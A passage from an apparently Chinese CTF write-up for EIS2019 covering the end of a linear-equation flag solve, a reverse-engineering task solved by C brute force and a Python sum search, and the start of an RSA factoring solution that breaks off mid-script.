a124- <span class="number">15102</span> * a130- <span class="number">22362</span> * a131 - <span class="number">20982750</span></span><br><span class="line">e20=<span class="number">59525</span> * a130+ <span class="number">23936</span> * a128+ <span class="number">61587</span> * a127+ <span class="number">4221</span> * a126+ <span class="number">55552</span> * a125+ <span class="number">13058</span> * a124+ <span class="number">45781</span> * a115+ <span class="number">65438</span> * a114+ <span class="number">51231</span> * a113+ <span class="number">33875</span> * a111+ <span class="number">6137</span> * a18+ <span class="number">62261</span> * a16+ <span class="number">46559</span> * a14+ <span class="number">26426</span> * a13+ <span class="number">9153</span> * a12+ <span class="number">6300</span> * a10- <span class="number">30549</span> * a11- <span class="number">55683</span> * a15- <span class="number">44433</span> * a17- <span class="number">46194</span> * a19- <span class="number">57198</span> * a110- <span class="number">45266</span> * a112- <span class="number">6605</span> * a116- <span class="number">43397</span> * a117- <span class="number">7672</span> * a118- <span class="number">48485</span> * a119- <span class="number">54035</span> * a120- <span class="number">12567</span> * a121- <span class="number">47051</span> * a122- <span class="number">62256</span> * a123- <span class="number">9828</span> * a129+ <span class="number">50225</span> * a131 - <span class="number">5070455</span></span><br><span class="line">e21=<span class="number">39286</span> * a130+ <span class="number">13236</span> * a129+ <span class="number">42884</span> * a124+ <span class="number">12704</span> * a123+ <span class="number">53136</span> * a122+ <span class="number">47722</span> * a119+ <span class="number">30422</span> * a118+ <span class="number">10481</span> * a117+ <span class="number">55058</span> * a116+ <span class="number">63967</span> * a115+ <span class="number">8353</span> * a111+ <span class="number">62270</span> * a110+ <span class="number">12090</span> * a19+ <span class="number">14796</span> * a14+ <span class="number">59059</span> * a13+ <span class="number">5686</span> * a12+ <span class="number">-28415</span> * a10+ <span class="number">36297</span> * a11- <span class="number">11307</span> * a15- <span class="number">57251</span> * a16- <span class="number">29507</span> * a17- <span class="number">41415</span> * a18- <span class="number">24476</span> * a112- <span class="number">41751</span> * a113- <span class="number">46589</span> * a114- <span class="number">55870</span> * a120- <span class="number">6321</span> * a121- <span class="number">34350</span> * a125- <span class="number">32922</span> * a126- <span class="number">64909</span> * a127- <span class="number">50870</span> * a128+ <span class="number">49349</span> * a131 - <span class="number">3066924</span></span><br><span class="line">e22=<span class="number">18612</span> * a127+ <span class="number">54808</span> * a125+ <span class="number">42491</span> * a123+ <span class="number">16634</span> * a122+ <span class="number">52361</span> * a121+ <span class="number">6252</span> * a120+ <span class="number">63445</span> * a118+ <span class="number">57764</span> * a116+ <span class="number">3991</span> * a115+ <span class="number">61646</span> * a114+ <span class="number">23244</span> * a110+ <span class="number">29174</span> * a19+ <span class="number">5707</span> * a16+ <span class="number">63976</span> * a14+ <span class="number">58731</span> * a12+ <span class="number">15479</span> * a10+ <span class="number">10453</span> * a11- <span class="number">9782</span> * a13- <span class="number">9166</span> * a15- <span class="number">21516</span> * a17- <span class="number">2689</span> * a18- <span class="number">47968</span> * a111- <span class="number">38843</span> * a112- <span class="number">13488</span> * a113- <span class="number">57649</span> * a117- <span class="number">487</span> * a119- <span class="number">30704</span> * a124- <span class="number">61218</span> * a126- <span class="number">32873</span> * a128- <span class="number">58677</span> * a129- <span class="number">2280</span> * a130+ <span class="number">35233</span> * a131 - <span class="number">26232118</span></span><br><span class="line">e23=<span class="number">38132</span> * a130+ <span class="number">58430</span> * a128+ <span class="number">38392</span> * a127+ <span class="number">29396</span> * a125+ <span class="number">15688</span> * a124+ <span class="number">28509</span> * a121+ <span class="number">23301</span> * a117+ <span class="number">56629</span> * a116+ <span class="number">11252</span> * a114+ <span class="number">28641</span> * a113+ <span class="number">35504</span> * a112+ <span class="number">41197</span> * a111+ <span class="number">9520</span> * a14+ <span class="number">50614</span> * a12+ <span class="number">36368</span> * a10- <span class="number">30534</span> * a11- <span class="number">7805</span> * a13- <span class="number">60795</span> * a15- <span class="number">17511</span> * a16- <span class="number">34692</span> * a17- <span class="number">22139</span> * a18- <span class="number">49013</span> * a19- <span class="number">24672</span> * a110- <span class="number">22264</span> * a115- <span class="number">55578</span> * a118- <span class="number">61882</span> * a119- <span class="number">48469</span> * a120- <span class="number">8197</span> * a122- <span class="number">43020</span> * a123- <span class="number">36911</span> * a126- <span class="number">6762</span> * a129+ <span class="number">56670</span> * a131 +<span class="number">860377</span></span><br><span class="line">e24=<span class="number">19958</span> * a129+ <span class="number">35318</span> * a127+ <span class="number">58305</span> * a124+ <span class="number">55072</span> * a120+ <span class="number">58300</span> * a116+ <span class="number">16494</span> * a113+ <span class="number">61205</span> * a19+ <span class="number">8511</span> * a18+ <span class="number">21876</span> * a16+ <span class="number">1791</span> * a13+ <span class="number">28247</span> * a12+ <span class="number">3542</span> * a10- <span class="number">17533</span> * a11- <span class="number">44455</span> * a14- <span class="number">2748</span> * a15- <span class="number">38052</span> * a17- <span class="number">16528</span> * a110- <span class="number">4664</span> * a111- <span class="number">13326</span> * a112- <span class="number">52661</span> * a114- <span class="number">38860</span> * a115- <span class="number">60164</span> * a117- <span class="number">39975</span> * a118- <span class="number">19566</span> * a119- <span class="number">55251</span> * a121- <span class="number">8160</span> * a122- <span class="number">54674</span> * a123- <span class="number">29010</span> * a125- <span class="number">6627</span> * a126- <span class="number">15962</span> * a128- <span class="number">10549</span> * a130- <span class="number">8177</span> * a131 +<span class="number">14482154</span></span><br><span class="line">e25=<span class="number">15394</span> * a129+ <span class="number">13827</span> * a128+ <span class="number">47703</span> * a127+ <span class="number">37204</span> * a126+ <span class="number">8621</span> * a123+ <span class="number">26034</span> * a120+ <span class="number">38644</span> * a119+ <span class="number">26883</span> * a118+ <span class="number">31346</span> * a117+ <span class="number">29853</span> * a115+ <span class="number">2052</span> * a113+ <span class="number">37617</span> * a18+ <span class="number">35004</span> * a13+ <span class="number">25124</span> * a12+ <span class="number">-7510</span> * a10- <span class="number">61303</span> * a11- <span class="number">34033</span> * a14- <span class="number">49161</span> * a15- <span class="number">6021</span> * a16- <span class="number">36125</span> * a17- <span class="number">10528</span> * a19- <span class="number">47741</span> * a110- <span class="number">45531</span> * a111- <span class="number">1546</span> * a112- <span class="number">59464</span> * a114- <span class="number">22656</span> * a116- <span class="number">24655</span> * a121- <span class="number">9816</span> * a122- <span class="number">22299</span> * a124- <span class="number">23745</span> * a125- <span class="number">23945</span> * a130+ <span class="number">48741</span> * a131 +<span class="number">17062269</span></span><br><span class="line">e26=<span class="number">27496</span> * a129+ <span class="number">8511</span> * a127+ <span class="number">61644</span> * a126+ <span class="number">35917</span> * a124+ <span class="number">16432</span> * a121+ <span class="number">53570</span> * a119+ <span class="number">30949</span> * a118+ <span class="number">56668</span> * a116+ <span class="number">5395</span> * a115+ <span class="number">47866</span> * a114+ <span class="number">33349</span> * a112+ <span class="number">41169</span> * a19+ <span class="number">34746</span> * a16+ <span class="number">39102</span> * a15+ <span class="number">19310</span> * a10+ <span class="number">1288</span> * a11- <span class="number">38840</span> * a12- <span class="number">49229</span> * a13- <span class="number">40618</span> * a14- <span class="number">41363</span> * a17- <span class="number">45367</span> * a18- <span class="number">21440</span> * a110- <span class="number">36535</span> * a111- <span class="number">43289</span> * a113- <span class="number">41392</span> * a117- <span class="number">40337</span> * a120- <span class="number">1430</span> * a122- <span class="number">28334</span> * a123- <span class="number">46487</span> * a125- <span class="number">42458</span> * a128- <span class="number">59664</span> * a130+ <span class="number">64335</span> * a131 - <span class="number">6695285</span></span><br><span class="line">e27=<span class="number">41403</span> * a129+ <span class="number">13806</span> * a127+ <span class="number">26203</span> * a126+ <span class="number">59304</span> * a124+ <span class="number">56824</span> * a122+ <span class="number">3954</span> * a121+ <span class="number">33269</span> * a120+ <span class="number">12986</span> * a116+ <span class="number">60427</span> * a115+ <span class="number">42087</span> * a114+ <span class="number">30996</span> * a113+ <span class="number">51835</span> * a111+ <span class="number">53494</span> * a19+ <span class="number">33384</span> * a18+ <span class="number">41797</span> * a14+ <span class="number">17974</span> * a13+ <span class="number">-18187</span> * a10+ <span class="number">28981</span> * a11- <span class="number">53485</span> * a12- <span class="number">20458</span> * a15- <span class="number">8491</span> * a16- <span class="number">16831</span> * a17- <span class="number">31995</span> * a110- <span class="number">12109</span> * a112- <span class="number">51691</span> * a117- <span class="number">58925</span> * a118- <span class="number">40872</span> * a119- <span class="number">30202</span> * a123- <span class="number">30793</span> * a125- <span class="number">42110</span> * a128- <span class="number">1100</span> * a130- <span class="number">26194</span> * a131 - <span class="number">16909859</span></span><br><span class="line">e28=<span class="number">53536</span> * a129+ <span class="number">47559</span> * a128+ <span class="number">42732</span> * a124+ <span class="number">34737</span> * a123+ <span class="number">48156</span> * a122+ <span class="number">15071</span> * a121+ <span class="number">38175</span> * a118+ <span class="number">12186</span> * a117+ <span class="number">28859</span> * a116+ <span class="number">19225</span> * a113+ <span class="number">28950</span> * a111+ <span class="number">19883</span> * a19+ <span class="number">40590</span> * a17+ <span class="number">44081</span> * a15+ <span class="number">20386</span> * a14+ <span class="number">-40011</span> * a10- <span class="number">26232</span> * a11- <span class="number">4849</span> * a12- <span class="number">60564</span> * a13- <span class="number">50739</span> * a16- <span class="number">17237</span> * a18- <span class="number">35381</span> * a110- <span class="number">4203</span> * a112- <span class="number">50964</span> * a114- <span class="number">39946</span> * a115- <span class="number">22511</span> * a119- <span class="number">20539</span> * a120- <span class="number">60250</span> * a125- <span class="number">61430</span> * a126- <span class="number">11009</span> * a127- <span class="number">8879</span> * a130+ <span class="number">46741</span> * a131 +<span class="number">1622782</span></span><br><span class="line">e29=<span class="number">5442</span> * a129+ <span class="number">45907</span> * a128+ <span class="number">7689</span> * a127+ <span class="number">56136</span> * a125+ <span class="number">20039</span> * a124+ <span class="number">18672</span> * a123+ <span class="number">41239</span> * a122+ <span class="number">9871</span> * a120+ <span class="number">34328</span> * a118+ <span class="number">27387</span> * a117+ <span class="number">41615</span> * a116+ <span class="number">41961</span> * a113+ <span class="number">50367</span> * a112+ <span class="number">59350</span> * a18+ <span class="number">29632</span> * a17+ <span class="number">22126</span> * a16+ <span class="number">61953</span> * a15+ <span class="number">34932</span> * a14+ <span class="number">3756</span> * a13+ <span class="number">-42653</span> * a10+ <span class="number">43668</span> * a11- <span class="number">10988</span> * a12- <span class="number">48711</span> * a19- <span class="number">23958</span> * a110- <span class="number">33557</span> * a111- <span class="number">17831</span> * a114- <span class="number">4583</span> * a115- <span class="number">29750</span> * a119- <span class="number">49888</span> * a121- <span class="number">30956</span> * a126- <span class="number">41068</span> * a130+ <span class="number">23514</span> * a131 - <span class="number">33025495</span></span><br><span class="line">e30=<span class="number">41909</span> * a126+ <span class="number">24036</span> * a124+ <span class="number">21760</span> * a122+ <span class="number">50228</span> * a121+ <span class="number">63177</span> * a119+ <span class="number">6738</span> * a118+ <span class="number">869</span> * a117+ <span class="number">19553</span> * a115+ <span class="number">53583</span> * a114+ <span class="number">59508</span> * a113+ <span class="number">15986</span> * a111+ <span class="number">3678</span> * a15+ <span class="number">10458</span> * a14+ <span class="number">5179</span> * a13+ <span class="number">38342</span> * a12+ <span class="number">-26968</span> * a10- <span class="number">23313</span> * a11- <span class="number">32333</span> * a16- <span class="number">43275</span> * a17- <span class="number">2423</span> * a18- <span class="number">60827</span> * a19- <span class="number">42621</span> * a110- <span class="number">27590</span> * a112- <span class="number">56307</span> * a116- <span class="number">30359</span> * a120- <span class="number">19919</span> * a123- <span class="number">18153</span> * a125- <span class="number">6931</span> * a127- <span class="number">5822</span> * a128- <span class="number">30949</span> * a129- <span class="number">16572</span> * a130+ <span class="number">11920</span> * a131 +<span class="number">10454601</span></span><br><span class="line">e31=<span class="number">43819</span> * a129+ <span class="number">54696</span> * a127+ <span class="number">55323</span> * a124+ <span class="number">63177</span> * a123+ <span class="number">6747</span> * a122+ <span class="number">31098</span> * a121+ <span class="number">37870</span> * a118+ <span class="number">55168</span> * a116+ <span class="number">1703</span> * a115+ <span class="number">64744</span> * a114+ <span class="number">57567</span> * a112+ <span class="number">35013</span> * a111+ <span class="number">52295</span> * a110+ <span class="number">46356</span> * a19+ <span class="number">29760</span> * a17+ <span class="number">4313</span> * a16+ <span class="number">18877</span> * a15+ <span class="number">8314</span> * a14+ <span class="number">35980</span> * a12+ <span class="number">8386</span> * a10+ <span class="number">57646</span> * a11- <span class="number">4029</span> * a13- <span class="number">47059</span> * a18- <span class="number">25490</span> * a113- <span class="number">62526</span> * a117- <span class="number">63227</span> * a119- <span class="number">27315</span> * a120- <span class="number">23370</span> * a125- <span class="number">37329</span> * a126- <span class="number">6309</span> * a128- <span class="number">12433</span> * a130+ <span class="number">8882</span> * a131 - <span class="number">51177223</span></span><br><span class="line">e32=<span class="number">17153</span> * a127 + <span class="number">41549</span> * a126 + <span class="number">28202</span> * a124 + <span class="number">36806</span> * a123 + <span class="number">12690</span> * a122 + <span class="number">42821</span> * a120 + <span class="number">39834</span> * a119 + <span class="number">17994</span> * a117 + <span class="number">32765</span> * a114 + <span class="number">25687</span> * a110 + <span class="number">33388</span> * a19 + <span class="number">143</span> * a14 + <span class="number">63776</span> *a10 + <span class="number">8682</span> * a11 - <span class="number">16324</span> * a12 - <span class="number">20022</span> * a13 - <span class="number">48973</span> * a15 - <span class="number">57775</span> * a16 - <span class="number">43820</span> * a17 - <span class="number">41070</span> * a18 - <span class="number">15669</span> * a111 - <span class="number">6946</span> * a112 - <span class="number">23187</span> * a113 - <span class="number">46495</span> * a115 - <span class="number">8395</span> * a116 - <span class="number">27782</span> * a118 - <span class="number">46043</span> * a121 - <span class="number">15428</span> * a125 - <span class="number">59010</span> * a128 - <span class="number">49235</span> * a129 - <span class="number">53666</span> * a130 + <span class="number">28539</span> * a131 +<span class="number">15479857</span></span><br><span class="line">[aa10,aa11,aa12,aa13,aa14,aa15,aa16,aa17,aa18,aa19,aa110,aa111,aa112,aa113,aa114,aa115,aa116,aa117,aa118,aa119,aa120,aa121,aa122,aa123,aa124,aa125,aa126,aa127,aa128,aa129,aa130,aa131]=solve(e1,e2,e3,e4,e5,e6,e7,e8,e9,e10,e11,e12,e13,e14,e15,e16,e17,e18,e19,e20,e21,e22,e23,e24,e25,e26,e27,e28,e29,e30,e31,e32,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a110,a111,a112,a113,a114,a115,a116,a117,a118,a119,a120,a121,a122,a123,a124,a125,a126,a127,a128,a129,a130,a131)</span><br></pre></td></tr></table></figure><p>即可得到flag。</p><h3 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h3><p>这题多解，我佛了</p><img src="/2019/11/21/EIS2019/26.png"><p>其实这一坨就是矩阵相乘取余，0x67144772A3C047E5LL * (signed __int128)v26) &gt;&gt; 64) &gt;&gt; 28)这里把v26提出来算常数就知道，是减去除666666666然后*666666666，这么一来就只剩余数了。(也可以把代码dump下来爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;memory.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll;</span><br><span class="line">ll table1[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">ll table2[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">ll table3[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">ll table3_old[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrpt1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ll tmp[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//ll tmp2[]=&#123;0,0,0,0,1,0,0,0,1&#125;;</span></span><br><span class="line">ll v26,v27;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;<span class="number">3</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(table2[j+<span class="number">3</span>*i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">3</span>;++k)</span><br><span class="line">&#123;v26=table1[j*<span class="number">3</span>+k]*table2[j+<span class="number">3</span>*i];</span><br><span class="line">v27=tmp[i*<span class="number">3</span>+k]+v26<span class="number">-666666666</span>*((((<span class="keyword">unsigned</span> __int128)(<span class="number">7427640243139921893</span>* (<span class="keyword">signed</span> __int128)v26) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">28</span>)-(v26&gt;&gt;<span class="number">63</span>));</span><br><span class="line">                                        tmp[i*<span class="number">3</span>+k]=v27<span class="number">-666666666</span>*((((<span class="keyword">unsigned</span> __int128)(<span class="number">7427640243139921893</span> *(<span class="keyword">signed</span> __int128) v27) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">28</span>)-(v27&gt;&gt;<span class="number">63</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(table2,tmp,<span class="keyword">sizeof</span>(table2));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">encrpt2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">ll tmp[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">ll v26,v27;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">3</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;<span class="number">3</span>;++j)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(table1[j+<span class="number">3</span>*i])</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;<span class="number">3</span>;++k)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">v26=table1[j*<span class="number">3</span>+k]*table1[j+<span class="number">3</span>*i];</span><br><span class="line">v27=tmp[i*<span class="number">3</span>+k]+v26<span class="number">-666666666</span>*((((<span class="keyword">unsigned</span> __int128)(<span class="number">7427640243139921893</span>* (<span class="keyword">signed</span> __int128)v26) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">28</span>)-(v26&gt;&gt;<span class="number">63</span>));</span><br><span class="line">                                        tmp[i*<span class="number">3</span>+k]=v27<span class="number">-666666666</span>*((((<span class="keyword">unsigned</span> __int128)(<span class="number">7427640243139921893</span> *(<span class="keyword">signed</span> __int128) v27) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">28</span>)-(v27&gt;&gt;<span class="number">63</span>));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">memcpy</span>(table1,tmp,<span class="keyword">sizeof</span>(table1));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">check1</span><span class="params">(ll input)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">while</span>(input)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(input &amp; <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">encrpt1();</span><br><span class="line">&#125;</span><br><span class="line">encrpt2();</span><br><span class="line">input&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> table2[<span class="number">5</span>]<span class="number">-666666666</span>*((((<span class="keyword">unsigned</span> __int128)(<span class="number">7427640243139921893</span>* (<span class="keyword">signed</span> __int128)table2[<span class="number">5</span>]) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">28</span>)-(table2[<span class="number">5</span>]&gt;&gt;<span class="number">63</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*ll i;</span></span><br><span class="line"><span class="comment">    check1(9766380);</span></span><br><span class="line"><span class="comment">for(int j=0;j&lt;=8;++j)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">cout&lt;&lt;table2[j]&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">ll i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">918020069</span>;++i)</span><br><span class="line">&#123;</span><br><span class="line">ll res;</span><br><span class="line">ll qtable1[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">ll qtable2[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line">ll qtable3[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">ll qtable3_old[]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="built_in">memcpy</span>(table1,qtable1,<span class="keyword">sizeof</span>(qtable1));</span><br><span class="line"><span class="built_in">memcpy</span>(table2,qtable2,<span class="keyword">sizeof</span>(qtable1));</span><br><span class="line"><span class="built_in">memcpy</span>(table3,qtable3,<span class="keyword">sizeof</span>(qtable1));</span><br><span class="line"><span class="built_in">memcpy</span>(table3_old,qtable3_old,<span class="keyword">sizeof</span>(qtable1));</span><br><span class="line">res=check1(i);</span><br><span class="line"><span class="keyword">if</span>(res==<span class="number">571036091</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;<span class="string">"okkkkkkkkkk!"</span>&lt;&lt;i&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*if(i%100000==0)</span></span><br><span class="line"><span class="comment">&#123;</span></span><br><span class="line"><span class="comment">cout&lt;&lt;i&lt;&lt;" "&lt;&lt;res&lt;&lt;endl;</span></span><br><span class="line"><span class="comment">&#125;*/</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ans=[<span class="number">5104421</span>,<span class="number">109010035</span>,<span class="number">119218877</span>,<span class="number">223124491</span>,<span class="number">233333333</span>,<span class="number">337238947</span>,<span class="number">347447789</span>,<span class="number">451353403</span>,<span class="number">461562245</span>,<span class="number">565467859</span>,<span class="number">575676701</span>,<span class="number">679582315</span>,<span class="number">689791157</span>,<span class="number">793696771</span>,<span class="number">803905613</span>,<span class="number">907811227</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(ans)):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(i+<span class="number">1</span>,len(ans)):</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(j+<span class="number">1</span>,len(ans)):</span><br><span class="line"><span class="keyword">if</span>(ans[i]+ans[j]+ans[k]==<span class="number">0x36B7DFE5</span>):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'flag&#123;'</span>+str(ans[i])+<span class="string">'_'</span>+str(ans[j])+<span class="string">'_'</span>+str(ans[k])+<span class="string">'&#125;'</span></span><br></pre></td></tr></table></figure><p>然后稍微试一试就知道了，然后发现多解。。。</p><img src="/2019/11/21/EIS2019/27.png"><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="rsa"><a href="#rsa" class="headerlink" title="rsa"></a>rsa</h3><p>设x是p的前200位，y是p的后200位</p><p>n=x*y*10^400+( y^2+x^2)*10^200+x*y</p><p>所以可以根据n的前200位以及最后200位确定出x*y的值(需要微调一下前200位的值)</p><p>已知x<em>y以及x\</em>y*10^400+( y^2+x^2)*10^200+x*y 可以求出x,y的值。具体如下脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">pimul=<span class="number">2117306430457495084373744640919209184441085835440785339151821982858580957554648046398035452941253078562547380021066127607547324391257803263684574686690799140082210093930925498879813981907487546461281266736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">n=<span class="number">21173064304574950843737446409192091844410858354407853391518219828585809575546480463980354529412530785625473800210661276075473243912578032636845746866907991400822100939309254988798139819074875464612813385347487571449985243023886473371811269444618192595245380064162413031254981146354667983890607067651694310528489568882179752700069248266341927980053359911075295668342299406306747805925686573419756406095039162847475158920069325898899318222396609393685237607183668014820188522330005608037386873926432131081161531088656666402464062741934007562757339219055643198715643442608910351994872740343566582808831066736088527333762011263273533065540484105964087424030617602336598479611569611018708530024591023015267812545697478378348866840434551477126856261767535209092047810194387033643274333303926423370062572301</span></span><br><span class="line">pjia2=(n-pimul*pow(<span 